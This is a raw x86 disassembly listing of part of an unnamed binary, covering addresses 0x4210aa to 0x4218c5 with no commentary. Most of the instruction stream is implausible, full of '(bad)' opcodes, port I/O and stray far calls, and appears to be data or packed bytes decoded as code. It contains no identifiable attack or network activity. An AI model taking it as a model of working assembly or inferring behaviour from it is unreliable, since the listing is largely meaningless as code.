  4210aa:	std    
  4210ab:	adc    eax,0x53485910
  4210b0:	les    esp,FWORD PTR [ecx-0x669e9c61]
  4210b6:	xor    ecx,esi
  4210b8:	out    0x43,al
  4210ba:	mov    al,0x16
  4210bc:	nop
  4210bd:	xchg   esp,eax
  4210be:	repnz mov ds:0xd0a2ec05,al
  4210c4:	pop    ds
  4210c5:	fadd   QWORD PTR [ebp+0x275693a7]
  4210cb:	mov    ebp,cs
  4210cd:	jl     0x4210b1
  4210cf:	xchg   ebp,eax
  4210d0:	push   es
  4210d1:	sbb    eax,0xb31b416a
  4210d6:	xor    al,0xf5
  4210d8:	mov    esi,0x32b5f1be
  4210dd:	xchg   esp,eax
  4210de:	adc    al,0x91
  4210e0:	mov    edx,0x72769bbb
  4210e5:	iret   
  4210e6:	push   ebx
  4210e7:	aad    0xd8
  4210e9:	pop    ebx
  4210ea:	aad    0x20
  4210ec:	xchg   dh,cl
  4210ee:	ror    BYTE PTR [ebx+0x59157c8c],1
  4210f4:	cmc    
  4210f5:	adc    al,0x2a
  4210f7:	or     eax,0x528807a1
  4210fc:	retf   
  4210fd:	adc    ecx,edx
  4210ff:	inc    esp
  421100:	out    0x6,eax
  421102:	repnz clc 
  421104:	mov    eax,0x32453ca2
  421109:	shl    BYTE PTR [edx-0x55083ca7],1
  42110f:	in     al,dx
  421110:	xor    ecx,DWORD PTR [ecx+eiz*8+0x35a7d24a]
  421117:	pop    es
  421118:	cmp    BYTE PTR [edx],0xde
  42111b:	jo     0x421179
  42111d:	inc    edi
  42111e:	add    eax,0x2b4e64bf
  421123:	dec    esi
  421124:	adc    al,0xc6
  421126:	inc    esp
  421127:	out    0x5e,eax
  421129:	lods   eax,DWORD PTR ds:[esi]
  42112a:	jl     0x42114f
  42112c:	clc    
  42112d:	ret    0xe471
  421130:	inc    edi
  421131:	ret    0x2f8a
  421134:	mov    edi,DWORD PTR [ecx]
  421136:	add    edx,edi
  421138:	mov    DWORD PTR [ecx],edx
  42113a:	mov    ecx,DWORD PTR [ebp+0x8]
  42113d:	xor    ecx,eax
  42113f:	add    ecx,esi
  421141:	jne    0x41ed92
  421147:	mov    ecx,DWORD PTR [ebp-0x8]
  42114a:	xor    ecx,eax
  42114c:	mov    eax,DWORD PTR [ebp+0x10]
  42114f:	add    ecx,esi
  421151:	mov    DWORD PTR [eax],ecx
  421153:	pop    edi
  421154:	pop    esi
  421155:	pop    ebx
  421156:	leave  
  421157:	ret    0xc
  42115a:	pop    ss
  42115b:	or     al,0x84
  42115d:	repz lahf 
  42115f:	sti    
  421160:	ja     0x42114e
  421162:	stos   BYTE PTR es:[edi],al
  421163:	mov    edx,0xa97688e2
  421168:	jmp    0x4211df
  42116a:	cmp    eax,0x5a0001cc
  42116f:	add    BYTE PTR [eax],al
  421171:	add    al,bh
  421173:	mov    ecx,0x89e1bac
  421178:	and    BYTE PTR ds:0x20c6cefd,0xe7
  42117f:	xor    al,0xf3
  421181:	ror    BYTE PTR [esp+edi*1+0x35],cl
  421185:	jns    0x421162
  421187:	out    0x38,al
  421189:	mul    DWORD PTR [ecx]
  42118b:	jo     0xf9fc1285
  421191:	and    eax,0x2c7649d0
  421196:	out    dx,al
  421197:	pushf  
  421198:	imul   esp,DWORD PTR [eax-0x9],0xf3a633bc
  42119f:	push   ecx
  4211a0:	fwait
  4211a1:	ror    BYTE PTR [ecx],cl
  4211a3:	mov    bh,ah
  4211a5:	add    BYTE PTR [ebx-0x569a0eb4],0x2a
  4211ac:	and    eax,0xc71ba6b
  4211b1:	or     DWORD PTR [ecx],edi
  4211b3:	call   0x623a2bef
  4211b8:	pop    eax
  4211b9:	scas   al,BYTE PTR es:[edi]
  4211ba:	not    DWORD PTR ds:0xb29665f9
  4211c0:	sbb    ch,BYTE PTR [edi-0x5aecf47c]
  4211c6:	adc    edi,ebp
  4211c8:	in     eax,0xa9
  4211ca:	sar    DWORD PTR [ebp+0x0],1
	...
  4211d9:	add    cl,dl
  4211db:	sub    al,0x14
  4211dd:	adc    edi,ebp
  4211df:	cmp    edx,edi
  4211e1:	out    dx,al
  4211e2:	pop    edi
  4211e3:	xchg   bx,ax
  4211e5:	push   0x7c091459
  4211ea:	xchg   edi,eax
  4211eb:	int3   
  4211ec:	add    DWORD PTR [eax],eax
  4211ee:	pop    edx
  4211ef:	add    BYTE PTR [eax],al
  4211f1:	add    BYTE PTR [edi-0x1b644e4c],dh
  4211f7:	xchg   edi,eax
  4211f8:	mov    DWORD PTR [ebx],ebx
  4211fa:	jmp    0x42117c
  4211fc:	daa    
  4211fd:	cld    
  4211fe:	clc    
  4211ff:	inc    esi
  421200:	xor    al,0x3
  421202:	icebp  
  421203:	xchg   cl,bl
  421205:	jg     0x421277
  421207:	es aad 0xb6
  42120a:	je     0x42127d
  42120c:	js     0x421224
  42120e:	leave  
  42120f:	mov    cl,0xfd
  421211:	addr16 call 0x17d67cac
  421217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421218:	(bad)
  42121b:	rcr    DWORD PTR [ebp-0x4fe662b2],cl
  421221:	inc    ebp
  421222:	stc    
  421223:	stos   BYTE PTR es:[edi],al
  421224:	jo     0x421277
  421226:	iret   
  421227:	repnz xor dh,BYTE PTR [esi]
  42122a:	scas   eax,DWORD PTR es:[edi]
  42122b:	fdivr  DWORD PTR [eax+0x6b3e3307]
  421231:	mov    ebp,0xf791880e
  421236:	inc    dl
  421238:	add    esi,ecx
  42123a:	fsubr  st,st(2)
  42123c:	ja     0x42122f
  42123e:	adc    bl,BYTE PTR [ecx+ebp*8+0x54]
  421242:	mov    dl,0x9
  421244:	stc    
  421245:	dec    ebp
  421246:	xor    esi,DWORD PTR [ebx+0xf]
  421249:	int    0x42
  42124b:	int3   
	...
  421258:	add    BYTE PTR [eax],al
  42125a:	pop    ds
  42125b:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421261:	sub    eax,esi
  421263:	add    BYTE PTR [edi+eax*2-0x451c4438],0xf1
  42126b:	int3   
  42126c:	add    DWORD PTR [eax],eax
  42126e:	pop    edx
  42126f:	add    BYTE PTR [eax],al
  421271:	add    BYTE PTR [edx],ah
  421273:	sahf   
  421274:	jno    0x421201
  421276:	sub    eax,0x4f516da2
  42127b:	and    eax,0xfa0ffdc7
  421280:	xlat   BYTE PTR ds:[ebx]
  421281:	lock or eax,0x3d1af2cd
  421287:	pop    esp
  421288:	ins    BYTE PTR es:[edi],dx
  421289:	xlat   BYTE PTR ds:[ebx]
  42128a:	ret    
  42128b:	dec    ebx
  42128c:	in     eax,0x15
  42128e:	jbe    0x421224
  421290:	fdivr  QWORD PTR [esi+eiz*8+0x716f2134]
  421297:	cmp    cl,0xcd
  42129a:	cmp    DWORD PTR [esp+ebp*4-0x7e414b94],ebx
  4212a1:	cmp    DWORD PTR [ebx+0xbc32853],edx
  4212a7:	dec    eax
  4212a8:	popf   
  4212a9:	enter  0x58cd,0x83
  4212ad:	adc    al,0xad
  4212af:	pop    esp
  4212b0:	stc    
  4212b1:	es push ebx
  4212b3:	ds cmp al,0xac
  4212b6:	popa   
  4212b7:	pop    DWORD PTR [ebp+0x66]
  4212ba:	(bad)  
  4212bb:	mov    ah,0x51
  4212bd:	mov    bh,0x19
  4212bf:	fs mov edi,0xdf4df098
  4212c5:	mov    ebx,0xca573ec1
  4212ca:	sbb    eax,0x17
	...
  4212d7:	add    BYTE PTR [eax],al
  4212d9:	add    BYTE PTR [edi],ch
  4212db:	and    al,0xf0
  4212dd:	aam    0xfb
  4212df:	aam    0x2f
  4212e1:	jmp    FWORD PTR [esi+0x33]
  4212e4:	je     0x42129c
  4212e6:	bound  edx,QWORD PTR [ebp-0x32b4bb3e]
  4212ec:	add    DWORD PTR [eax],eax
  4212ee:	pop    edx
  4212ef:	add    BYTE PTR [eax],al
  4212f1:	add    BYTE PTR [eax+ecx*2],cl
  4212f4:	(bad)  
  4212f6:	push   esi
  4212f7:	mov    ebx,0x288feb71
  4212fc:	pop    ebx
  4212fd:	fcom   st(0)
  4212ff:	sbb    DWORD PTR [esi],eax
  421301:	fld    st(7)
  421303:	(bad)  
  421304:	fwait
  421305:	shl    DWORD PTR [ebx+0x3a744282],cl
  42130b:	xor    bl,BYTE PTR ds:0x62117213
  421311:	out    0x7a,al
  421313:	sbb    ebp,ecx
  421315:	dec    edi
  421316:	sti    
  421317:	call   0x61f7a7b5
  42131c:	dec    esi
  42131d:	popa   
  42131e:	aas    
  42131f:	push   ebp
  421320:	cmp    al,0x5b
  421322:	sub    DWORD PTR [edi+edx*2+0x75],eax
  421326:	push   edi
  421327:	jno    0x4212f3
  421329:	jno    0x421340
  42132b:	xor    esi,eax
  42132d:	and    BYTE PTR [ecx-0x39],dl
  421330:	(bad)  
  421331:	js     0x421318
  421333:	inc    ebx
  421334:	imul   eax,DWORD PTR [esp+ecx*2-0x742bcd21],0xb1c1ac4e
  42133f:	int3   
  421340:	xor    DWORD PTR fs:[ecx-0x2e],0xffffffec
  421345:	loop   0x421335
  421347:	mov    al,ds:0x2a6c7d39
	...
  421358:	add    BYTE PTR [eax],al
  42135a:	retf   0x76a0
  42135d:	dec    ebp
  42135e:	jle    0x42133f
  421360:	sti    
  421361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421362:	mov    bh,0x83
  421364:	dec    edi
  421365:	mov    ds:0x3411c0ee,al
  42136a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42136b:	int    0x1
  42136d:	add    BYTE PTR [edx+0x0],bl
  421370:	add    BYTE PTR [eax],al
  421372:	pop    eax
  421373:	xchg   ebx,eax
  421374:	xor    ebx,edx
  421376:	out    0x27,eax
  421378:	mov    WORD PTR [edi-0x7f],cs
  42137b:	mov    al,ds:0xb88818f1
  421380:	jp     0x4213cd
  421382:	xchg   edx,eax
  421383:	gs in  eax,dx
  421385:	mov    bl,0x9f
  421387:	ja     0x4213a3
  421389:	dec    ebp
  42138a:	push   0xffffff8d
  42138c:	in     eax,0xd
  42138e:	call   0xd375d7e3
  421393:	inc    edx
  421394:	nop
  421395:	mov    WORD PTR [esi-0x6364bd0d],?
  42139b:	push   ecx
  42139c:	dec    ecx
  42139d:	push   edx
  42139e:	pop    ebp
  42139f:	jl     0x421395
  4213a1:	scas   al,BYTE PTR es:[edi]
  4213a2:	test   al,0x72
  4213a4:	mov    bh,0x22
  4213a6:	push   ebp
  4213a7:	mov    ds:0x9846f799,al
  4213ac:	int3   
  4213ad:	pusha  
  4213ae:	or     al,0x51
  4213b0:	add    DWORD PTR [ebx],edi
  4213b2:	imul   ebx,DWORD PTR ds:0x732fbf54,0x27
  4213b9:	mov    eax,ds:0xb60e42da
  4213be:	fwait
  4213bf:	and    ecx,DWORD PTR [ebp+0x4b554b0e]
  4213c5:	mov    ebp,0xbf980e24
  4213ca:	jg     0x42136c
	...
  4213d8:	add    BYTE PTR [eax],al
  4213da:	(bad)  
  4213db:	out    dx,al
  4213dc:	lods   al,BYTE PTR ds:[esi]
  4213dd:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4213e4:	stc    
  4213e5:	stc    
  4213e6:	add    edi,ecx
  4213e8:	lock sar bh,1
  4213eb:	int    0x1
  4213ed:	add    BYTE PTR [edx+0x0],bl
  4213f0:	add    BYTE PTR [eax],al
  4213f2:	and    BYTE PTR [edi],bh
  4213f4:	sbb    edi,eax
  4213f6:	imul   esp,DWORD PTR [edx-0x55e81dd1],0x6e
  4213fd:	cmp    bl,BYTE PTR [esi+0x73]
  421400:	push   eax
  421401:	pop    ds
  421402:	push   es
  421403:	cs pop ds
  421405:	(bad)  
  421406:	xor    edi,DWORD PTR [ecx+edi*4]
  421409:	jmp    0x42146e
  42140b:	aam    0xc7
  42140d:	mov    ebp,ecx
  42140f:	in     al,0xf1
  421411:	sbb    BYTE PTR [eax-0x5f862a0b],bl
  421417:	in     al,0xc2
  421419:	int3   
  42141a:	popf   
  42141b:	inc    esi
  42141c:	lds    edi,FWORD PTR [eax+0xa]
  42141f:	sub    al,0xf8
  421421:	or     BYTE PTR ds:0x269cf58e,al
  421427:	std    
  421428:	call   0xa3de:0x65e0767d
  42142f:	sbb    eax,DWORD PTR [ebp-0x2397c697]
  421435:	or     al,0x8e
  421437:	sub    DWORD PTR [ebx-0x55],ebx
  42143a:	ds mov al,0xde
  42143d:	aas    
  42143e:	push   ss
  42143f:	mov    edi,0x566f580d
  421444:	xor    DWORD PTR [edi+edx*8],edx
  421447:	retf   0xac38
  42144a:	fsub   st(7),st
	...
  421458:	add    BYTE PTR [eax],al
  42145a:	push   edx
  42145b:	xor    al,0x40
  42145d:	gs data16 jne 0x4214d8
  421461:	aaa    
  421462:	push   0xeb6a4e09
  421467:	sar    edi,1
  421469:	sub    ebx,DWORD PTR [ecx-0x32]
  42146c:	add    DWORD PTR [eax],eax
  42146e:	pop    edx
  42146f:	add    BYTE PTR [eax],al
  421471:	add    BYTE PTR [ebx-0x36fe4bb4],dl
  421477:	imul   esp,DWORD PTR [ecx],0xffffffae
  42147a:	add    edx,DWORD PTR [esp+eax*2-0x30]
  42147e:	pushf  
  42147f:	dec    eax
  421480:	jl     0x4214e8
  421482:	das    
  421483:	outs   dx,BYTE PTR es:[esi]
  421485:	inc    eax
  421486:	mov    esi,0x1dec2873
  42148b:	mov    ch,0x3e
  42148d:	gs mov esi,0xc2fd6a36
  421493:	adc    edx,DWORD PTR [ecx+0x435a91b5]
  421499:	shr    BYTE PTR [edx-0x32],0xb2
  42149d:	push   ecx
  42149e:	jb     0x421516
  4214a0:	sbb    cl,dl
  4214a2:	xchg   ebp,eax
  4214a3:	adc    DWORD PTR [esi-0x1b],ecx
  4214a6:	jno    0x4214a9
  4214a8:	mov    BYTE PTR ds:0x7ef29805,dl
  4214ae:	pop    eax
  4214af:	mov    bl,0xac
  4214b1:	imul   ebx,DWORD PTR [edx-0x71],0xffffffe1
  4214b5:	xchg   esi,eax
  4214b6:	jns    0x421471
  4214b8:	sbb    DWORD PTR [esi],ebp
  4214ba:	loope  0x4214d8
  4214bc:	es repz mov ah,0xaa
  4214c0:	sbb    DWORD PTR [ebx+0x7b],0x1e
  4214c4:	cmp    DWORD PTR [ebp+0x1d],0xffffffbc
  4214c8:	adc    DWORD PTR [edx+0xb70e],esi
	...
  4214da:	dec    ecx
  4214db:	inc    esi
  4214dc:	sub    BYTE PTR [eax],dh
  4214de:	das    
  4214df:	jle    0x42153a
  4214e1:	jg     0x4214a9
  4214e3:	imul   esi,eax,0xffffffd5
  4214e6:	push   es
  4214e7:	cmc    
  4214e8:	hlt    
  4214e9:	imul   ch
  4214eb:	fild   WORD PTR [ecx]
  4214ed:	add    BYTE PTR [edx+0x0],bl
  4214f0:	add    BYTE PTR [eax],al
  4214f2:	pop    eax
  4214f3:	enter  0x6baa,0x4b
  4214f7:	imul   edx,DWORD PTR [edi],0x41
  4214fa:	ss mov fs,ebp
  4214fd:	test   BYTE PTR [esi+0x2fc3cb28],0x4c
  421504:	bound  esi,QWORD PTR ds:0x854794e
  42150a:	pop    ss
  42150b:	mov    esp,0x52adacae
  421510:	jno    0x42152a
  421512:	aad    0x34
  421514:	jmp    0x4a14:0x857b2d70
  42151b:	sahf   
  42151c:	aas    
  42151d:	shl    DWORD PTR [ebx],0x17
  421520:	pushf  
  421521:	pop    edi
  421522:	jecxz  0x42155c
  421524:	ret    0x788d
  421527:	in     eax,dx
  421528:	out    0x99,al
  42152a:	stc    
  42152b:	adc    DWORD PTR [ebx-0x7],esi
  42152e:	mov    BYTE PTR [ecx-0x51b1229c],bl
  421534:	xchg   ebp,eax
  421535:	rcl    BYTE PTR [ecx-0x3c],cl
  421538:	sub    bl,BYTE PTR [esi+0x2ae04b38]
  42153e:	out    0x6c,eax
  421540:	loopne 0x42159e
  421542:	(bad)  
  421543:	cli    
  421544:	scas   al,BYTE PTR es:[edi]
  421545:	xchg   cl,bh
  421547:	data16 das 
  421549:	and    eax,0x21f0
	...
  42155a:	addr16 (bad) 
  42155c:	and    dh,dh
  42155e:	mov    eax,ds:0xe7d7f7f6
  421563:	mov    eax,0x58ddda72
  421568:	call   0x2225d41
  42156d:	add    BYTE PTR [edx+0x0],bl
  421570:	add    BYTE PTR [eax],al
  421572:	cmp    eax,0xdc8ca873
  421577:	mov    ebx,0x6eb29026
  42157c:	xlat   BYTE PTR ds:[ebx]
  42157d:	call   0x693a:0xcad6e37f
  421584:	int3   
  421585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421586:	wrmsr  
  421588:	aam    0xd3
  42158a:	sti    
  42158b:	lea    ecx,[edx]
  42158d:	jne    0x4215ab
  42158f:	xchg   esp,eax
  421590:	mov    ebx,esp
  421592:	mov    al,ds:0x755030bf
  421597:	mov    esi,0xf1dbfc8e
  42159c:	jo     0x421537
  42159e:	mov    al,0xd8
  4215a0:	ja     0x421543
  4215a2:	xchg   edx,eax
  4215a3:	inc    edx
  4215a4:	adc    BYTE PTR [ecx],dl
  4215a6:	push   cs
  4215a7:	xchg   BYTE PTR [edi+0x661a52ce],ah
  4215ad:	push   cs
  4215ae:	push   esi
  4215af:	scas   eax,DWORD PTR es:[edi]
  4215b0:	nop
  4215b1:	das    
  4215b2:	outs   dx,DWORD PTR ds:[esi]
  4215b3:	ds jmp 0x6fe8:0xaceba340
  4215bb:	call   0x524d:0x270a9fac
  4215c2:	cli    
  4215c3:	cmp    al,0xd5
  4215c5:	mov    ds,WORD PTR [ecx-0x31a1ecb9]
  4215cb:	add    BYTE PTR [eax],0x0
	...
  4215da:	ret    
  4215db:	or     eax,0xefee66a6
  4215e0:	ret    
  4215e1:	lods   eax,DWORD PTR ds:[esi]
  4215e2:	sub    al,0xb8
  4215e4:	mov    ds:0xc8451447,eax
  4215e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215ea:	mov    eax,ds:0x5a0001e0
  4215ef:	add    BYTE PTR [eax],al
  4215f1:	add    dh,ah
  4215f3:	neg    DWORD PTR [esi]
  4215f5:	pop    ebp
  4215f6:	add    eax,0xa23e29fe
  4215fb:	outs   dx,DWORD PTR ds:[esi]
  4215fc:	adc    esi,0x49
  4215ff:	cld    
  421600:	cmc    
  421601:	fst    DWORD PTR [esi]
  421603:	xor    BYTE PTR [edx+0x4a],dh
  421606:	int    0x75
  421608:	or     DWORD PTR [eax-0x30],0x61de1287
  42160f:	sbb    BYTE PTR [esi+0x11],bh
  421612:	test   eax,0x86cbcf47
  421617:	cs adc al,0xef
  42161a:	push   cs
  42161b:	fs pop ebp
  42161d:	les    edi,FWORD PTR [esi]
  42161f:	mov    dl,0x4b
  421621:	paddsb mm1,QWORD PTR [eax-0x7f885c2]
  421628:	movaps xmm2,XMMWORD PTR [ecx-0x32]
  42162c:	sub    DWORD PTR [esi-0x69],edx
  42162f:	cdq    
  421630:	psubusw mm2,QWORD PTR [ecx]
  421633:	outs   dx,BYTE PTR ds:[esi]
  421634:	out    0x2d,al
  421636:	mov    bh,0x4f
  421638:	mov    ch,0x8e
  42163a:	sub    eax,0xe56ceae4
  42163f:	xchg   edi,eax
  421640:	dec    edx
  421641:	pop    ebp
  421642:	fisub  DWORD PTR [ebx+esi*1+0x1981a0bc]
  421649:	jge    0x421662
  42164b:	push   cs
	...
  421658:	add    BYTE PTR [eax],al
  42165a:	fld    st(2)
  42165c:	add    eax,0xddcf1f49
  421661:	ror    al,cl
  421663:	outs   dx,DWORD PTR ds:[esi]
  421664:	clc    
  421665:	rcl    BYTE PTR [ebx-0x2f],cl
  421668:	addr16 xor al,0xfb
  42166b:	loopne 0x42166e
  42166d:	add    BYTE PTR [edx+0x0],bl
  421670:	add    BYTE PTR [eax],al
  421672:	inc    eax
  421673:	mov    dh,0xf8
  421675:	sahf   
  421676:	lods   eax,DWORD PTR ds:[esi]
  421677:	push   ecx
  421678:	and    DWORD PTR [edi-0x4],ecx
  42167b:	loopne 0x421699
  42167d:	dec    eax
  42167e:	cdq    
  42167f:	call   DWORD PTR [ebp-0x1b]
  421682:	ja     0x4216cd
  421684:	cmp    DWORD PTR [ebx],edi
  421686:	mov    ch,0x51
  421688:	fwait
  421689:	cmp    esi,DWORD PTR [ecx+0x4bcc9f5]
  42168f:	jge    0x4216c6
  421691:	rcl    BYTE PTR [ecx+0x50],0x7
  421695:	add    eax,0xb1b69bab
  42169a:	sub    eax,0xd22bf33a
  42169f:	mov    ?,WORD PTR [edi+0x64]
  4216a2:	repnz pop eax
  4216a4:	mov    DWORD PTR [edx-0xe4d4a57],0xa1d8cc0d
  4216ae:	jo     0x421646
  4216b0:	int    0x47
  4216b2:	xchg   esi,eax
  4216b3:	out    dx,eax
  4216b4:	push   ds
  4216b5:	(bad)  
  4216b6:	addr16 pop es
  4216b8:	jne    0x421649
  4216ba:	test   BYTE PTR [esi-0x245d731],cl
  4216c0:	out    0xac,al
  4216c2:	faddp  st(6),st
  4216c4:	add    DWORD PTR [eax],ebp
  4216c6:	inc    eax
  4216c7:	loope  0x42173a
  4216c9:	sub    al,0xfb
  4216cb:	inc    ebx
	...
  4216d8:	add    BYTE PTR [eax],al
  4216da:	popa   
  4216db:	pop    edi
  4216dc:	lock (bad) 
  4216de:	(bad)  
  4216df:	out    dx,eax
  4216e0:	repz pop edi
  4216e2:	mov    dl,0xc5
  4216e4:	ret    
  4216e5:	in     eax,dx
  4216e6:	mov    ?,edi
  4216e8:	ds xor al,0x55
  4216eb:	loope  0x4216ee
  4216ed:	add    BYTE PTR ds:0xb6000000,bl
  4216f3:	xchg   edi,eax
  4216f4:	add    al,0x79
  4216f6:	cmp    DWORD PTR [edx],edx
  4216f8:	sub    BYTE PTR [esi],ah
  4216fa:	cdq    
  4216fb:	dec    edx
  4216fc:	inc    eax
  4216fd:	pushf  
  4216fe:	push   ds
  4216ff:	mov    ds:0x6ec04b5f,eax
  421704:	int    0x5a
  421706:	imul   ebp,DWORD PTR [ebx-0x76],0xbf148bf6
  42170d:	adc    BYTE PTR [edx],dl
	...
  42171b:	nop
  42171c:	inc    edx
  42171d:	add    BYTE PTR [eax+edx*4],al
  421720:	inc    edx
  421721:	add    BYTE PTR [eax],cl
  421723:	nop
  421724:	inc    edx
  421725:	add    BYTE PTR [eax+edx*4],cl
  421728:	inc    edx
  421729:	add    BYTE PTR [eax],dl
  42172b:	nop
  42172c:	inc    edx
  42172d:	add    BYTE PTR [eax+edx*4],dl
  421730:	inc    edx
  421731:	add    BYTE PTR [eax],bl
  421733:	nop
  421734:	inc    edx
  421735:	add    BYTE PTR [eax+edx*4],bl
  421738:	inc    edx
  421739:	add    BYTE PTR [eax],al
  42173b:	mov    al,ds:0xa0040042
  421740:	inc    edx
  421741:	add    BYTE PTR [eax],cl
  421743:	mov    al,ds:0xa00c0042
  421748:	inc    edx
  421749:	add    BYTE PTR [eax],dl
  42174b:	mov    al,ds:0xa0140042
  421750:	inc    edx
  421751:	add    BYTE PTR [eax],bl
  421753:	mov    al,ds:0xa01c0042
  421758:	inc    edx
  421759:	add    BYTE PTR [eax],al
  42175b:	mov    al,0x42
  42175d:	add    BYTE PTR [eax+esi*4],al
  421760:	inc    edx
  421761:	add    BYTE PTR [eax],cl
  421763:	mov    al,0x42
  421765:	add    BYTE PTR [eax+esi*4],cl
  421768:	inc    edx
  421769:	add    BYTE PTR [eax],dl
  42176b:	mov    al,0x42
  42176d:	add    BYTE PTR [eax+esi*4],dl
  421770:	inc    edx
  421771:	add    BYTE PTR [eax],bl
  421773:	mov    al,0x42
  421775:	add    BYTE PTR [eax+esi*4],bl
  421778:	inc    edx
  421779:	add    BYTE PTR [eax+0x66],bh
  42177c:	ins    BYTE PTR es:[edi],dx
  42177d:	jp     0x4217d6
  42177f:	jbe    0x4217c8
  421781:	ja     0x4217c6
  421783:	js     0x4217cd
  421785:	jno    0x4217ea
  421787:	inc    edx
  421788:	inc    bx
  42178a:	push   ebp
  42178b:	jno    0x421803
  42178d:	ja     0x4217f6
  42178f:	dec    edi
  421790:	dec    esp
  421791:	dec    ebp
  421792:	inc    edx
  421793:	jno    0x421806
  421795:	jae    0x4217ea
  421797:	push   eax
  421798:	arpl   WORD PTR [ebx+0x42],dx
  42179b:	sbb    eax,DWORD PTR [edx+0x0]
  42179e:	dec    edx
  42179f:	sbb    eax,DWORD PTR [edx+0x0]
  4217a2:	loop   0x4217bd
  4217a4:	inc    edx
  4217a5:	add    bh,ch
  4217a7:	or     esi,DWORD PTR [edx+0x304e790e]
  4217ad:	dec    esi
  4217ae:	xchg   DWORD PTR [edi+0x3d],ecx
  4217b1:	dec    esi
  4217b2:	scas   eax,DWORD PTR es:[edi]
  4217b3:	dec    edi
  4217b4:	ds dec esi
  4217b6:	js     0x421806
  4217b8:	cmp    ecx,DWORD PTR [esi-0x64]
  4217bb:	dec    edi
  4217bc:	inc    esp
  4217bd:	dec    esi
  4217be:	jae    0x42180e
  4217c0:	inc    ecx
  4217c1:	dec    esi
  4217c2:	xor    BYTE PTR [esi+0x40],cl
  4217c5:	dec    esi
  4217c6:	pop    esp
  4217c7:	pop    ebp
  4217c8:	pop    edi
  4217c9:	push   edx
  4217ca:	cmp    DWORD PTR [esi+0x79],ecx
  4217cd:	dec    esi
  4217ce:	xor    BYTE PTR [esi-0x79],cl
  4217d1:	dec    edi
  4217d2:	cmp    eax,0x3e4faf4e
  4217d7:	dec    esi
  4217d8:	js     0x421828
  4217da:	cmp    ecx,DWORD PTR [esi-0x64]
  4217dd:	dec    edi
  4217de:	inc    esp
  4217df:	dec    esi
  4217e0:	mov    DWORD PTR [edi+0x41],ecx
  4217e3:	dec    esi
  4217e4:	xor    BYTE PTR [esi+0x40],cl
  4217e7:	dec    esi
  4217e8:	pop    esp
  4217e9:	ins    DWORD PTR es:[edi],dx
  4217ea:	pop    edi
  4217eb:	bound  edi,QWORD PTR [ecx]
  4217ed:	dec    esi
  4217ee:	jns    0x42183e
  4217f0:	xor    BYTE PTR [esi-0x80],cl
  4217f3:	dec    edi
  4217f4:	cmp    eax,0x394e734e
  4217f9:	dec    esi
  4217fa:	mov    ds:0x304e3a4f,al
  4217ff:	dec    esi
  421800:	inc    esi
  421801:	dec    esi
  421802:	pop    esp
  421803:	jge    0x421864
  421805:	jb     0x421876
  421807:	sub    BYTE PTR [esi-0x7d],0x7e
  42180b:	xchg   ebx,eax
  42180c:	jns    0x42179e
  42180e:	aas    
  42180f:	dec    esi
  421810:	test   BYTE PTR [edi+0x30],cl
  421813:	dec    esi
  421814:	test   BYTE PTR [edi+0x3c],cl
  421817:	dec    esi
  421818:	mov    ds:0x734e394f,al
  42181d:	dec    esi
  42181e:	inc    ebp
  42181f:	dec    esi
  421820:	xor    BYTE PTR [esi+0x44],cl
  421823:	dec    esi
  421824:	pop    esp
  421825:	lea    ebx,[edi-0x7e]
  421828:	outs   dx,DWORD PTR ds:[esi]
  421829:	xchg   edx,eax
  42182a:	outs   dx,BYTE PTR ds:[esi]
  42182b:	xchg   ebx,eax
  42182c:	jle    0x4217d1
  42182e:	jns    0x4217d0
  421830:	aas    
  421831:	dec    esi
  421832:	test   BYTE PTR [edi+0x30],cl
  421835:	dec    esi
  421836:	test   BYTE PTR [edi+0x3c],cl
  421839:	dec    esi
  42183a:	mov    ds:0x894e394f,al
  42183f:	dec    edi
  421840:	inc    ebp
  421841:	dec    esi
  421842:	xor    BYTE PTR [esi+0x44],cl
  421845:	dec    esi
  421846:	pop    esp
  421847:	popf   
  421848:	pop    edi
  421849:	xchg   edx,eax
  42184a:	outs   dx,DWORD PTR ds:[esi]
  42184b:	mov    ds:0xb37ea36e,al
  421850:	jns    0x421802
  421852:	aas    
  421853:	dec    esi
  421854:	mov    cs,WORD PTR [edi+0x30]
  421857:	dec    esi
  421858:	lods   al,BYTE PTR ds:[esi]
  421859:	dec    edi
  42185a:	cmp    eax,0x394e734e
  42185f:	dec    esi
  421860:	mov    eax,ds:0x304e3a4f
  421865:	dec    esi
  421866:	inc    esp
  421867:	dec    esi
  421868:	pop    esp
  421869:	lods   eax,DWORD PTR ds:[esi]
  42186a:	pop    edi
  42186b:	mov    ds:0xb36eb26f,al
  421870:	jle    0x421835
  421872:	jns    0x421834
  421874:	aas    
  421875:	dec    esi
  421876:	mov    cs,WORD PTR [edi+0x30]
  421879:	dec    esi
  42187a:	lods   al,BYTE PTR ds:[esi]
  42187b:	dec    edi
  42187c:	cmp    eax,0x394e7e4e
  421881:	dec    esi
  421882:	lahf   
  421883:	dec    edi
  421884:	cmp    ecx,DWORD PTR [esi+0x30]
  421887:	dec    esi
  421888:	inc    ebp
  421889:	dec    esi
  42188a:	pop    esp
  42188b:	mov    ebp,0xc26fb25f
  421890:	outs   dx,BYTE PTR ds:[esi]
  421891:	ret    
  421892:	jle    0x421867
  421894:	jns    0x421866
  421896:	aas    
  421897:	dec    esi
  421898:	mov    cs,WORD PTR [edi+0x30]
  42189b:	dec    esi
  42189c:	lods   al,BYTE PTR ds:[esi]
  42189d:	dec    edi
  42189e:	cmp    eax,0x394f804e
  4218a3:	dec    esi
  4218a4:	lods   al,BYTE PTR ds:[esi]
  4218a5:	dec    edi
  4218a6:	cmp    cl,BYTE PTR [esi+0x30]
  4218a9:	dec    esi
  4218aa:	inc    esi
  4218ab:	dec    esi
  4218ac:	pop    esp
  4218ad:	int    0x5f
  4218af:	ret    0xd26f
  4218b2:	outs   dx,BYTE PTR ds:[esi]
  4218b3:	sar    DWORD PTR [esi-0x1d],cl
  4218b6:	jns    0x421898
  4218b8:	aas    
  4218b9:	dec    esi
  4218ba:	mov    cs,WORD PTR [edi+0x30]
  4218bd:	dec    esi
  4218be:	lods   al,BYTE PTR ds:[esi]
  4218bf:	dec    edi
  4218c0:	cmp    eax,0x394f834e
  4218c5:	dec    esi
